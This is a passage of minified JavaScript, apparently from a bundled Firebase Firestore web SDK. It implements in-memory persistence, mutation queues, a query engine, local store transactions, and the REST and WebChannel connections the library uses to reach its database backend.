Rt(e,t);this.kr=this.kr.add(n),this.qr=this.qr.add(n)}$r(e,t){e.forEach((n=>this.addReference(n,t)))}removeReference(e,t){this.Wr(new Rt(e,t))}Qr(e,t){e.forEach((n=>this.removeReference(n,t)))}Gr(e){const t=new Be(new Qa([])),n=new Rt(t,e),i=new Rt(t,e+1),r=[];return this.qr.forEachInRange([n,i],(l=>{this.Wr(l),r.push(l.key)})),r}zr(){this.kr.forEach((e=>this.Wr(e)))}Wr(e){this.kr=this.kr.delete(e),this.qr=this.qr.delete(e)}jr(e){const t=new Be(new Qa([])),n=new Rt(t,e),i=new Rt(t,e+1);let r=pa();return this.qr.forEachInRange([n,i],(l=>{r=r.add(l.key)})),r}containsKey(e){const t=new Rt(e,0),n=this.kr.firstAfterOrEqual(t);return n!==null&&e.isEqual(n.key)}}class Rt{constructor(e,t){this.key=e,this.Hr=t}static Kr(e,t){return Be.comparator(e.key,t.key)||da(e.Hr,t.Hr)}static Ur(e,t){return da(e.Hr,t.Hr)||Be.comparator(e.key,t.key)}}class WU{constructor(e,t){this.indexManager=e,this.referenceDelegate=t,this.mutationQueue=[],this.Yn=1,this.Jr=new Et(Rt.Kr)}checkEmpty(e){return ve.resolve(this.mutationQueue.length===0)}addMutationBatch(e,t,n,i){const r=this.Yn;this.Yn++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const l=new cU(r,t,n,i);this.mutationQueue.push(l);for(const u of i)this.Jr=this.Jr.add(new Rt(u.key,r)),this.indexManager.addToCollectionParentIndex(e,u.key.path.popLast());return ve.resolve(l)}lookupMutationBatch(e,t){return ve.resolve(this.Zr(t))}getNextMutationBatchAfterBatchId(e,t){const n=t+1,i=this.Xr(n),r=i<0?0:i;return ve.resolve(this.mutationQueue.length>r?this.mutationQueue[r]:null)}getHighestUnacknowledgedBatchId(){return ve.resolve(this.mutationQueue.length===0?yE:this.Yn-1)}getAllMutationBatches(e){return ve.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,t){const n=new Rt(t,0),i=new Rt(t,Number.POSITIVE_INFINITY),r=[];return this.Jr.forEachInRange([n,i],(l=>{const u=this.Zr(l.Hr);r.push(u)})),ve.resolve(r)}getAllMutationBatchesAffectingDocumentKeys(e,t){let n=new Et(da);return t.forEach((i=>{const r=new Rt(i,0),l=new Rt(i,Number.POSITIVE_INFINITY);this.Jr.forEachInRange([r,l],(u=>{n=n.add(u.Hr)}))})),ve.resolve(this.Yr(n))}getAllMutationBatchesAffectingQuery(e,t){const n=t.path,i=n.length+1;let r=n;Be.isDocumentKey(r)||(r=r.child(""));const l=new Rt(new Be(r),0);let u=new Et(da);return this.Jr.forEachWhile((d=>{const p=d.key.path;return!!n.isPrefixOf(p)&&(p.length===i&&(u=u.add(d.Hr)),!0)}),l),ve.resolve(this.Yr(u))}Yr(e){const t=[];return e.forEach((n=>{const i=this.Zr(n);i!==null&&t.push(i)})),t}removeMutationBatch(e,t){Aa(this.ei(t.batchId,"removed")===0,55003),this.mutationQueue.shift();let n=this.Jr;return ve.forEach(t.mutations,(i=>{const r=new Rt(i.key,t.batchId);return n=n.delete(r),this.referenceDelegate.markPotentiallyOrphaned(e,i.key)})).next((()=>{this.Jr=n}))}nr(e){}containsKey(e,t){const n=new Rt(t,0),i=this.Jr.firstAfterOrEqual(n);return ve.resolve(t.isEqual(i&&i.key))}performConsistencyCheck(e){return this.mutationQueue.length,ve.resolve()}ei(e,t){return this.Xr(e)}Xr(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}Zr(e){const t=this.Xr(e);return t<0||t>=this.mutationQueue.length?null:this.mutationQueue[t]}}class KU{constructor(e){this.ti=e,this.docs=(function(){return new Wa(Be.comparator)})(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,t){const n=t.key,i=this.docs.get(n),r=i?i.size:0,l=this.ti(t);return this.docs=this.docs.insert(n,{document:t.mutableCopy(),size:l}),this.size+=l-r,this.indexManager.addToCollectionParentIndex(e,n.path.popLast())}removeEntry(e){const t=this.docs.get(e);t&&(this.docs=this.docs.remove(e),this.size-=t.size)}getEntry(e,t){const n=this.docs.get(t);return ve.resolve(n?n.document.mutableCopy():Ht.newInvalidDocument(t))}getEntries(e,t){let n=Wo();return t.forEach((i=>{const r=this.docs.get(i);n=n.insert(i,r?r.document.mutableCopy():Ht.newInvalidDocument(i))})),ve.resolve(n)}getDocumentsMatchingQuery(e,t,n,i){let r=Wo();const l=t.path,u=new Be(l.child("__id-9223372036854775808__")),d=this.docs.getIteratorFrom(u);for(;d.hasNext();){const{key:p,value:{document:f}}=d.getNext();if(!l.isPrefixOf(p.path))break;p.path.length>l.length+1||S5(E5(f),n)<=0||(i.has(f.key)||Zh(t,f))&&(r=r.insert(f.key,f.mutableCopy()))}return ve.resolve(r)}getAllFromCollectionGroup(e,t,n,i){Ge(9500)}ni(e,t){return ve.forEach(this.docs,(n=>t(n)))}newChangeBuffer(e){return new YU(this)}getSize(e){return ve.resolve(this.size)}}class YU extends FU{constructor(e){super(),this.Mr=e}applyChanges(e){const t=[];return this.changes.forEach(((n,i)=>{i.isValidDocument()?t.push(this.Mr.addEntry(e,i)):this.Mr.removeEntry(n)})),ve.waitFor(t)}getFromCache(e,t){return this.Mr.getEntry(e,t)}getAllFromCache(e,t){return this.Mr.getEntries(e,t)}}class $U{constructor(e){this.persistence=e,this.ri=new pl((t=>CE(t)),TE),this.lastRemoteSnapshotVersion=Ke.min(),this.highestTargetId=0,this.ii=0,this.si=new RE,this.targetCount=0,this.oi=Mc._r()}forEachTarget(e,t){return this.ri.forEach(((n,i)=>t(i))),ve.resolve()}getLastRemoteSnapshotVersion(e){return ve.resolve(this.lastRemoteSnapshotVersion)}getHighestSequenceNumber(e){return ve.resolve(this.ii)}allocateTargetId(e){return this.highestTargetId=this.oi.next(),ve.resolve(this.highestTargetId)}setTargetsMetadata(e,t,n){return n&&(this.lastRemoteSnapshotVersion=n),t>this.ii&&(this.ii=t),ve.resolve()}lr(e){this.ri.set(e.target,e);const t=e.targetId;t>this.highestTargetId&&(this.oi=new Mc(t),this.highestTargetId=t),e.sequenceNumber>this.ii&&(this.ii=e.sequenceNumber)}addTargetData(e,t){return this.lr(t),this.targetCount+=1,ve.resolve()}updateTargetData(e,t){return this.lr(t),ve.resolve()}removeTargetData(e,t){return this.ri.delete(t.target),this.si.Gr(t.targetId),this.targetCount-=1,ve.resolve()}removeTargets(e,t,n){let i=0;const r=[];return this.ri.forEach(((l,u)=>{u.sequenceNumber<=t&&n.get(u.targetId)===null&&(this.ri.delete(l),r.push(this.removeMatchingKeysForTargetId(e,u.targetId)),i++)})),ve.waitFor(r).next((()=>i))}getTargetCount(e){return ve.resolve(this.targetCount)}getTargetData(e,t){const n=this.ri.get(t)||null;return ve.resolve(n)}addMatchingKeys(e,t,n){return this.si.$r(t,n),ve.resolve()}removeMatchingKeys(e,t,n){this.si.Qr(t,n);const i=this.persistence.referenceDelegate,r=[];return i&&t.forEach((l=>{r.push(i.markPotentiallyOrphaned(e,l))})),ve.waitFor(r)}removeMatchingKeysForTargetId(e,t){return this.si.Gr(t),ve.resolve()}getMatchingKeysForTargetId(e,t){const n=this.si.jr(t);return ve.resolve(n)}containsKey(e,t){return ve.resolve(this.si.containsKey(t))}}class vw{constructor(e,t){this._i={},this.overlays={},this.ai=new Jh(0),this.ui=!1,this.ui=!0,this.ci=new JU,this.referenceDelegate=e(this),this.li=new $U(this),this.indexManager=new _U,this.remoteDocumentCache=(function(i){return new KU(i)})((n=>this.referenceDelegate.hi(n))),this.serializer=new MU(t),this.Pi=new GU(this.serializer)}start(){return Promise.resolve()}shutdown(){return this.ui=!1,Promise.resolve()}get started(){return this.ui}setDatabaseDeletedListener(){}setNetworkEnabled(){}getIndexManager(e){return this.indexManager}getDocumentOverlayCache(e){let t=this.overlays[e.toKey()];return t||(t=new QU,this.overlays[e.toKey()]=t),t}getMutationQueue(e,t){let n=this._i[e.toKey()];return n||(n=new WU(t,this.referenceDelegate),this._i[e.toKey()]=n),n}getGlobalsCache(){return this.ci}getTargetCache(){return this.li}getRemoteDocumentCache(){return this.remoteDocumentCache}getBundleCache(){return this.Pi}runTransaction(e,t,n){De("MemoryPersistence","Starting transaction:",e);const i=new XU(this.ai.next());return this.referenceDelegate.Ti(),n(i).next((r=>this.referenceDelegate.Ii(i).next((()=>r)))).toPromise().then((r=>(i.raiseOnCommittedEvent(),r)))}Ei(e,t){return ve.or(Object.values(this._i).map((n=>()=>n.containsKey(e,t))))}}class XU extends T5{constructor(e){super(),this.currentSequenceNumber=e}}class IE{constructor(e){this.persistence=e,this.Ri=new RE,this.Ai=null}static Vi(e){return new IE(e)}get di(){if(this.Ai)return this.Ai;throw Ge(60996)}addReference(e,t,n){return this.Ri.addReference(n,t),this.di.delete(n.toString()),ve.resolve()}removeReference(e,t,n){return this.Ri.removeReference(n,t),this.di.add(n.toString()),ve.resolve()}markPotentiallyOrphaned(e,t){return this.di.add(t.toString()),ve.resolve()}removeTarget(e,t){this.Ri.Gr(t.targetId).forEach((i=>this.di.add(i.toString())));const n=this.persistence.getTargetCache();return n.getMatchingKeysForTargetId(e,t.targetId).next((i=>{i.forEach((r=>this.di.add(r.toString())))})).next((()=>n.removeTargetData(e,t)))}Ti(){this.Ai=new Set}Ii(e){const t=this.persistence.getRemoteDocumentCache().newChangeBuffer();return ve.forEach(this.di,(n=>{const i=Be.fromPath(n);return this.mi(e,i).next((r=>{r||t.removeEntry(i,Ke.min())}))})).next((()=>(this.Ai=null,t.apply(e))))}updateLimboDocument(e,t){return this.mi(e,t).next((n=>{n?this.di.delete(t.toString()):this.di.add(t.toString())}))}hi(e){return 0}mi(e,t){return ve.or([()=>ve.resolve(this.Ri.containsKey(t)),()=>this.persistence.getTargetCache().containsKey(e,t),()=>this.persistence.Ei(e,t)])}}class bh{constructor(e,t){this.persistence=e,this.fi=new pl((n=>P5(n.path)),((n,i)=>n.isEqual(i))),this.garbageCollector=BU(this,t)}static Vi(e,t){return new bh(e,t)}Ti(){}Ii(e){return ve.resolve()}forEachTarget(e,t){return this.persistence.getTargetCache().forEachTarget(e,t)}dr(e){const t=this.pr(e);return this.persistence.getTargetCache().getTargetCount(e).next((n=>t.next((i=>n+i))))}pr(e){let t=0;return this.mr(e,(n=>{t++})).next((()=>t))}mr(e,t){return ve.forEach(this.fi,((n,i)=>this.wr(e,n,i).next((r=>r?ve.resolve():t(i)))))}removeTargets(e,t,n){return this.persistence.getTargetCache().removeTargets(e,t,n)}removeOrphanedDocuments(e,t){let n=0;const i=this.persistence.getRemoteDocumentCache(),r=i.newChangeBuffer();return i.ni(e,(l=>this.wr(e,l,t).next((u=>{u||(n++,r.removeEntry(l,Ke.min()))})))).next((()=>r.apply(e))).next((()=>n))}markPotentiallyOrphaned(e,t){return this.fi.set(t,e.currentSequenceNumber),ve.resolve()}removeTarget(e,t){const n=t.withSequenceNumber(e.currentSequenceNumber);return this.persistence.getTargetCache().updateTargetData(e,n)}addReference(e,t,n){return this.fi.set(n,e.currentSequenceNumber),ve.resolve()}removeReference(e,t,n){return this.fi.set(n,e.currentSequenceNumber),ve.resolve()}updateLimboDocument(e,t){return this.fi.set(t,e.currentSequenceNumber),ve.resolve()}hi(e){let t=e.key.toString().length;return e.isFoundDocument()&&(t+=_f(e.data.value)),t}wr(e,t,n){return ve.or([()=>this.persistence.Ei(e,t),()=>this.persistence.getTargetCache().containsKey(e,t),()=>{const i=this.fi.get(t);return ve.resolve(i!==void 0&&i>n)}])}getCacheSize(e){return this.persistence.getRemoteDocumentCache().getSize(e)}}class wE{constructor(e,t,n,i){this.targetId=e,this.fromCache=t,this.Ts=n,this.Is=i}static Es(e,t){let n=pa(),i=pa();for(const r of t.docChanges)switch(r.type){case 0:n=n.add(r.doc.key);break;case 1:i=i.add(r.doc.key)}return new wE(e,t.fromCache,n,i)}}class ZU{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}}class e6{constructor(){this.Rs=!1,this.As=!1,this.Vs=100,this.ds=(function(){return FO()?8:x5(Qt())>0?6:4})()}initialize(e,t){this.fs=e,this.indexManager=t,this.Rs=!0}getDocumentsMatchingQuery(e,t,n,i){const r={result:null};return this.gs(e,t).next((l=>{r.result=l})).next((()=>{if(!r.result)return this.ps(e,t,i,n).next((l=>{r.result=l}))})).next((()=>{if(r.result)return;const l=new ZU;return this.ys(e,t,l).next((u=>{if(r.result=u,this.As)return this.ws(e,t,l,u.size)}))})).next((()=>r.result))}ws(e,t,n,i){return n.documentReadCount<this.Vs?(lc()<=ua.DEBUG&&De("QueryEngine","SDK will not create cache indexes for query:",cc(t),"since it only creates cache indexes for collection contains","more than or equal to",this.Vs,"documents"),ve.resolve()):(lc()<=ua.DEBUG&&De("QueryEngine","Query:",cc(t),"scans",n.documentReadCount,"local documents and returns",i,"documents as results."),n.documentReadCount>this.ds*i?(lc()<=ua.DEBUG&&De("QueryEngine","The SDK decides to create cache indexes for query:",cc(t),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,no(t))):ve.resolve())}gs(e,t){if(n2(t))return ve.resolve(null);let n=no(t);return this.indexManager.getIndexType(e,n).next((i=>i===0?null:(t.limit!==null&&i===1&&(t=t0(t,null,"F"),n=no(t)),this.indexManager.getDocumentsMatchingTarget(e,n).next((r=>{const l=pa(...r);return this.fs.getDocuments(e,l).next((u=>this.indexManager.getMinOffset(e,n).next((d=>{const p=this.bs(t,u);return this.Ss(t,p,l,d.readTime)?this.gs(e,t0(t,null,"F")):this.Ds(e,p,t,d)}))))})))))}ps(e,t,n,i){return n2(t)||i.isEqual(Ke.min())?ve.resolve(null):this.fs.getDocuments(e,n).next((r=>{const l=this.bs(t,r);return this.Ss(t,l,n,i)?ve.resolve(null):(lc()<=ua.DEBUG&&De("QueryEngine","Re-using previous result from %s to execute query: %s",i.toString(),cc(t)),this.Ds(e,l,t,y5(i,$d)).next((u=>u)))}))}bs(e,t){let n=new Et(WI(e));return t.forEach(((i,r)=>{Zh(e,r)&&(n=n.add(r))})),n}Ss(e,t,n,i){if(e.limit===null)return!1;if(n.size!==t.size)return!0;const r=e.limitType==="F"?t.last():t.first();return!!r&&(r.hasPendingWrites||r.version.compareTo(i)>0)}ys(e,t,n){return lc()<=ua.DEBUG&&De("QueryEngine","Using full collection scan to execute query:",cc(t)),this.fs.getDocumentsMatchingQuery(e,t,$s.min(),n)}Ds(e,t,n,i){return this.fs.getDocumentsMatchingQuery(e,n,i).next((r=>(t.forEach((l=>{r=r.insert(l.key,l)})),r)))}}const jE="LocalStore",a6=3e8;class t6{constructor(e,t,n,i){this.persistence=e,this.Cs=t,this.serializer=i,this.vs=new Wa(da),this.Fs=new pl((r=>CE(r)),TE),this.Ms=new Map,this.xs=e.getRemoteDocumentCache(),this.li=e.getTargetCache(),this.Pi=e.getBundleCache(),this.Os(n)}Os(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new HU(this.xs,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.xs.setIndexManager(this.indexManager),this.Cs.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",(t=>e.collect(t,this.vs)))}}function n6(a,e,t,n){return new t6(a,e,t,n)}async function yw(a,e){const t=$e(a);return await t.persistence.runTransaction("Handle user change","readonly",(n=>{let i;return t.mutationQueue.getAllMutationBatches(n).next((r=>(i=r,t.Os(e),t.mutationQueue.getAllMutationBatches(n)))).next((r=>{const l=[],u=[];let d=pa();for(const p of i){l.push(p.batchId);for(const f of p.mutations)d=d.add(f.key)}for(const p of r){u.push(p.batchId);for(const f of p.mutations)d=d.add(f.key)}return t.localDocuments.getDocuments(n,d).next((p=>({Ns:p,removedBatchIds:l,addedBatchIds:u})))}))}))}function i6(a,e){const t=$e(a);return t.persistence.runTransaction("Acknowledge batch","readwrite-primary",(n=>{const i=e.batch.keys(),r=t.xs.newChangeBuffer({trackRemovals:!0});return(function(u,d,p,f){const h=p.batch,E=h.keys();let C=ve.resolve();return E.forEach((A=>{C=C.next((()=>f.getEntry(d,A))).next((j=>{const R=p.docVersions.get(A);Aa(R!==null,48541),j.version.compareTo(R)<0&&(h.applyToRemoteDocument(j,p),j.isValidDocument()&&(j.setReadTime(p.commitVersion),f.addEntry(j)))}))})),C.next((()=>u.mutationQueue.removeMutationBatch(d,h)))})(t,n,e,r).next((()=>r.apply(n))).next((()=>t.mutationQueue.performConsistencyCheck(n))).next((()=>t.documentOverlayCache.removeOverlaysForBatchId(n,i,e.batch.batchId))).next((()=>t.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(n,(function(u){let d=pa();for(let p=0;p<u.mutationResults.length;++p)u.mutationResults[p].transformResults.length>0&&(d=d.add(u.batch.mutations[p].key));return d})(e)))).next((()=>t.localDocuments.getDocuments(n,i)))}))}function Ew(a){const e=$e(a);return e.persistence.runTransaction("Get last remote snapshot version","readonly",(t=>e.li.getLastRemoteSnapshotVersion(t)))}function o6(a,e){const t=$e(a),n=e.snapshotVersion;let i=t.vs;return t.persistence.runTransaction("Apply remote event","readwrite-primary",(r=>{const l=t.xs.newChangeBuffer({trackRemovals:!0});i=t.vs;const u=[];e.targetChanges.forEach(((f,h)=>{const E=i.get(h);if(!E)return;u.push(t.li.removeMatchingKeys(r,f.removedDocuments,h).next((()=>t.li.addMatchingKeys(r,f.addedDocuments,h))));let C=E.withSequenceNumber(r.currentSequenceNumber);e.targetMismatches.get(h)!==null?C=C.withResumeToken(Ut.EMPTY_BYTE_STRING,Ke.min()).withLastLimboFreeSnapshotVersion(Ke.min()):f.resumeToken.approximateByteSize()>0&&(C=C.withResumeToken(f.resumeToken,n)),i=i.insert(h,C),(function(j,R,I){return j.resumeToken.approximateByteSize()===0||R.snapshotVersion.toMicroseconds()-j.snapshotVersion.toMicroseconds()>=a6?!0:I.addedDocuments.size+I.modifiedDocuments.size+I.removedDocuments.size>0})(E,C,f)&&u.push(t.li.updateTargetData(r,C))}));let d=Wo(),p=pa();if(e.documentUpdates.forEach((f=>{e.resolvedLimboDocuments.has(f)&&u.push(t.persistence.referenceDelegate.updateLimboDocument(r,f))})),u.push(s6(r,l,e.documentUpdates).next((f=>{d=f.Bs,p=f.Ls}))),!n.isEqual(Ke.min())){const f=t.li.getLastRemoteSnapshotVersion(r).next((h=>t.li.setTargetsMetadata(r,r.currentSequenceNumber,n)));u.push(f)}return ve.waitFor(u).next((()=>l.apply(r))).next((()=>t.localDocuments.getLocalViewOfDocuments(r,d,p))).next((()=>d))})).then((r=>(t.vs=i,r)))}function s6(a,e,t){let n=pa(),i=pa();return t.forEach((r=>n=n.add(r))),e.getEntries(a,n).next((r=>{let l=Wo();return t.forEach(((u,d)=>{const p=r.get(u);d.isFoundDocument()!==p.isFoundDocument()&&(i=i.add(u)),d.isNoDocument()&&d.version.isEqual(Ke.min())?(e.removeEntry(u,d.readTime),l=l.insert(u,d)):!p.isValidDocument()||d.version.compareTo(p.version)>0||d.version.compareTo(p.version)===0&&p.hasPendingWrites?(e.addEntry(d),l=l.insert(u,d)):De(jE,"Ignoring outdated watch update for ",u,". Current version:",p.version," Watch version:",d.version)})),{Bs:l,Ls:i}}))}function r6(a,e){const t=$e(a);return t.persistence.runTransaction("Get next mutation batch","readonly",(n=>(e===void 0&&(e=yE),t.mutationQueue.getNextMutationBatchAfterBatchId(n,e))))}function l6(a,e){const t=$e(a);return t.persistence.runTransaction("Allocate target","readwrite",(n=>{let i;return t.li.getTargetData(n,e).next((r=>r?(i=r,ve.resolve(i)):t.li.allocateTargetId(n).next((l=>(i=new Bs(e,l,"TargetPurposeListen",n.currentSequenceNumber),t.li.addTargetData(n,i).next((()=>i)))))))})).then((n=>{const i=t.vs.get(n.targetId);return(i===null||n.snapshotVersion.compareTo(i.snapshotVersion)>0)&&(t.vs=t.vs.insert(n.targetId,n),t.Fs.set(e,n.targetId)),n}))}async function r0(a,e,t){const n=$e(a),i=n.vs.get(e),r=t?"readwrite":"readwrite-primary";try{t||await n.persistence.runTransaction("Release target",r,(l=>n.persistence.referenceDelegate.removeTarget(l,i)))}catch(l){if(!Hc(l))throw l;De(jE,`Failed to update sequence numbers for target ${e}: ${l}`)}n.vs=n.vs.remove(e),n.Fs.delete(i.target)}function g2(a,e,t){const n=$e(a);let i=Ke.min(),r=pa();return n.persistence.runTransaction("Execute query","readwrite",(l=>(function(d,p,f){const h=$e(d),E=h.Fs.get(f);return E!==void 0?ve.resolve(h.vs.get(E)):h.li.getTargetData(p,f)})(n,l,no(e)).next((u=>{if(u)return i=u.lastLimboFreeSnapshotVersion,n.li.getMatchingKeysForTargetId(l,u.targetId).next((d=>{r=d}))})).next((()=>n.Cs.getDocumentsMatchingQuery(l,e,t?i:Ke.min(),t?r:pa()))).next((u=>(c6(n,W5(e),u),{documents:u,ks:r})))))}function c6(a,e,t){let n=a.Ms.get(e)||Ke.min();t.forEach(((i,r)=>{r.readTime.compareTo(n)>0&&(n=r.readTime)})),a.Ms.set(e,n)}class b2{constructor(){this.activeTargetIds=eU()}Qs(e){this.activeTargetIds=this.activeTargetIds.add(e)}Gs(e){this.activeTargetIds=this.activeTargetIds.delete(e)}Ws(){const e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}}class u6{constructor(){this.vo=new b2,this.Fo={},this.onlineStateHandler=null,this.sequenceNumberHandler=null}addPendingMutation(e){}updateMutationState(e,t,n){}addLocalQueryTarget(e,t=!0){return t&&this.vo.Qs(e),this.Fo[e]||"not-current"}updateQueryState(e,t,n){this.Fo[e]=t}removeLocalQueryTarget(e){this.vo.Gs(e)}isLocalQueryTarget(e){return this.vo.activeTargetIds.has(e)}clearQueryState(e){delete this.Fo[e]}getAllActiveQueryTargets(){return this.vo.activeTargetIds}isActiveQueryTarget(e){return this.vo.activeTargetIds.has(e)}start(){return this.vo=new b2,Promise.resolve()}handleUserChange(e,t,n){}setOnlineState(e){}shutdown(){}writeSequenceNumber(e){}notifyBundleLoaded(e){}}class d6{Mo(e){}shutdown(){}}const v2="ConnectivityMonitor";class y2{constructor(){this.xo=()=>this.Oo(),this.No=()=>this.Bo(),this.Lo=[],this.ko()}Mo(e){this.Lo.push(e)}shutdown(){window.removeEventListener("online",this.xo),window.removeEventListener("offline",this.No)}ko(){window.addEventListener("online",this.xo),window.addEventListener("offline",this.No)}Oo(){De(v2,"Network connectivity changed: AVAILABLE");for(const e of this.Lo)e(0)}Bo(){De(v2,"Network connectivity changed: UNAVAILABLE");for(const e of this.Lo)e(1)}static v(){return typeof window<"u"&&window.addEventListener!==void 0&&window.removeEventListener!==void 0}}let yf=null;function l0(){return yf===null?yf=(function(){return 268435456+Math.round(2147483648*Math.random())})():yf++,"0x"+yf.toString(16)}const Gv="RestConnection",p6={BatchGetDocuments:"batchGet",Commit:"commit",RunQuery:"runQuery",RunAggregationQuery:"runAggregationQuery",ExecutePipeline:"executePipeline"};class m6{get Ko(){return!1}constructor(e){this.databaseInfo=e,this.databaseId=e.databaseId;const t=e.ssl?"https":"http",n=encodeURIComponent(this.databaseId.projectId),i=encodeURIComponent(this.databaseId.database);this.qo=t+"://"+e.host,this.Uo=`projects/${n}/databases/${i}`,this.$o=this.databaseId.database===uh?`project_id=${n}`:`project_id=${n}&database_id=${i}`}Wo(e,t,n,i,r){const l=l0(),u=this.Qo(e,t.toUriEncodedString());De(Gv,`Sending RPC '${e}' ${l}:`,u,n);const d={"google-cloud-resource-prefix":this.Uo,"x-goog-request-params":this.$o};this.Go(d,i,r);const{host:p}=new URL(u),f=zc(p);return this.zo(e,u,d,n,f).then((h=>(De(Gv,`Received RPC '${e}' ${l}: `,h),h)),(h=>{throw sl(Gv,`RPC '${e}' ${l} failed with error: `,h,"url: ",u,"request:",n),h}))}jo(e,t,n,i,r,l){return this.Wo(e,t,n,i,r)}Go(e,t,n){e["X-Goog-Api-Client"]=(function(){return"gl-js/ fire/"+Fc})(),e["Content-Type"]="text/plain",this.databaseInfo.appId&&(e["X-Firebase-GMPID"]=this.databaseInfo.appId),t&&t.headers.forEach(((i,r)=>e[r]=i)),n&&n.headers.forEach(((i,r)=>e[r]=i))}Qo(e,t){const n=p6[e];let i=`${this.qo}/v1/${t}:${n}`;return this.databaseInfo.apiKey&&(i=`${i}?key=${encodeURIComponent(this.databaseInfo.apiKey)}`),i}terminate(){}}class f6{constructor(e){this.Ho=e.Ho,this.Jo=e.Jo}Zo(e){this.Xo=e}Yo(e){this.e_=e}t_(e){this.n_=e}onMessage(e){this.r_=e}close(){this.Jo()}send(e){this.Ho(e)}i_(){this.Xo()}s_(){this.e_()}o_(e){this.n_(e)}__(e){this.r_(e)}}const Ft="WebChannelConnection",rd=(a,e,t)=>{a.listen(e,(n=>{try{t(n)}catch(i){setTimeout((()=>{throw i}),0)}}))};class Sc extends m6{constructor(e){super(e),this.a_=[],this.forceLongPolling=e.forceLongPolling,this.autoDetectLongPolling=e.autoDetectLongPolling,this.useFetchStreams=e.useFetchStreams,this.longPollingOptions=e.longPollingOptions}static u_(){if(!Sc.c_){const e=PI();rd(e,AI.STAT_EVENT,(t=>{t.stat===Yy.PROXY?De(Ft,"STAT_EVENT: detected buffering proxy"):t.stat===Yy.NOPROXY&&De(Ft,"STAT_EVENT: detected no buffering proxy")})),Sc.c_=!0}}zo(e,t,n,i,r){const l=l0();return new Promise(((u,d)=>{const p=new TI;p.setWithCredentials(!0),p.listenOnce(xI.COMPLETE,(()=>{try{switch(p.getLastErrorCode()){case Nf.NO_ERROR:const h=p.getResponseJson();De(Ft,`XHR for RPC '${e}' ${l} received:`,JSON.stringify(h)),u(h);break;case Nf.TIMEOUT:De(Ft,`RPC '${e}' ${l} timed out`),d(new ke(Se.DEADLINE_EXCEEDED,"Request time out"));break;case Nf.HTTP_ERROR:const E=p.getStatus();if(De(Ft,`RPC '${e}' ${l} failed with status:`,E,"response text:",p.getResponseText()),E>0){let C=p.getResponseJson();Array.isArray(C)&&(C=C[0]);const A=C?.error;if(A&&A.status&&A.message){const j=(function(I){const w=I.toLowerCase().replace(/_/g,"-");return Object.values(Se).indexOf(w)>=0?w:Se.UNKNOWN})(A.status);d(new ke(j,A.message))}else d(new ke(Se.UNKNOWN,"Server responded with status "+p.getStatus()))}else d(new ke(Se.UNAVAILABLE,"Connection failed."));break;default:Ge(9055,{l_:e,streamId:l,h_:p.getLastErrorCode(),P_:p.getLastError()})}}finally{De(Ft,`RPC '${e}' ${l} completed.`)}}));const f=JSON.stringify(i);De(Ft,`RPC '${e}' ${l} sending request:`,i),p.send(t,"POST",f,n,15)}))}T_(e,t,n){const i=l0(),r=[this.qo,"/","google.firestore.v1.Firestore","/",e,"/channel"],l=this.createWebChannelTransport(),u={httpSessionIdParam:"gsessionid",initMessageHeaders:{},messageUrlParams:{database:`projects/${this.databaseId.projectId}/databases/${this.databaseId.database}`},sendRawJson:!0,supportsCrossDomainXhr:!0,internalChannelParams:{forwardChannelRequestTimeoutMs:6e5},forceLongPolling:this.forceLongPolling,detectBufferingProxy:this.autoDetectLongPolling},d=this.longPollingOptions.timeoutSeconds;d!==void 0&&(u.longPollingTimeout=Math.round(1e3*d)),this.useFetchStreams&&(u.useFetchStreams=!0),this.Go(u.initMessageHeaders,t,n),u.encodeInitMessageHeaders=!0;const p=r.join("");De(Ft,`Creating RPC '${e}' stream ${i}: ${p}`,u);const f=l.createWebChannel(p,u);this.I_(f);let h=!1,E=!1;const C=new f6({Ho:A=>{E?De(Ft,`Not sending because RPC '${e}' stream ${i} is closed:`,A):(h||(De(Ft,`Opening RPC '${e}' stream ${i} transport.`),f.open(),h=!0),De(Ft,`RPC '${e}' stream ${i} sending:`,A),f.send(A))},Jo:()=>f.close()});return rd(f,yd.EventType.OPEN,(()=>{E||(De(Ft,`RPC '${e}' stream ${i} transport opened.`),C.i_())})),rd(f,yd.EventType.CLOSE,(()=>{E||(E=!0,De(Ft,`RPC '${e}' stream ${i} transport closed`),C.o_(),this.E_(f))})),rd(f,yd.EventType.ERROR,(A=>{E||(E=!0,sl(Ft,`RPC '${e}' stream ${i} transport errored. Name:`,A.name,"Message:",A.message),C.o_(new ke(Se.UNAVAILABLE,"The operation could not be completed")))})),rd(f,yd.EventType.MESSAGE,(A=>{if(!E){const j=A.data[0];Aa(!!j,16349);const R=j,I=R?.error||R[0]?.error;if(I){De(Ft,`RPC '${e}' stream ${i} received error:`,I);const w=I.status;let k=(function(Q){const q=dt[Q];if(q!==void 0)return sw(q)})(w),Y=I.message;w==="NOT_FOUND"&&Y.includes("database")&&Y.includes("does not exist")&&Y.includes(this.databaseId.database)&&sl(`Database '${this.databaseId.database}' not found. Please check your project configuration.`),k===void 0&&(k=Se.INTERNAL,Y="Unknown error status: "+w+" with message "+I.message),E=!0,C.o_(new ke(k,Y)),f.close()}else De(Ft,`RPC '${e}' stream ${i} received:`,j),C.__(j)}})),Sc.u_(),setTimeout((()=>{C.s_()}),0),C}terminate(){this.a_.forEach((e=>e.close())),this.a_=[]}I_(e){this.a_.push(e)}E_(e){this.a_=this.a_.filter((t=>t===e))}Go(e,t,n){super.Go(e,t,n),this.databaseInfo.apiKey&&(e["x-goog-api-key"]=this.databaseInfo.apiKey)}createWebChannelTransport(){return LI()}}function h6(a){return new Sc(a)}function Qv(){return typeof document<"u"?document:null}function ng(a){return new yU(a,!0)}Sc.c_=!1;class 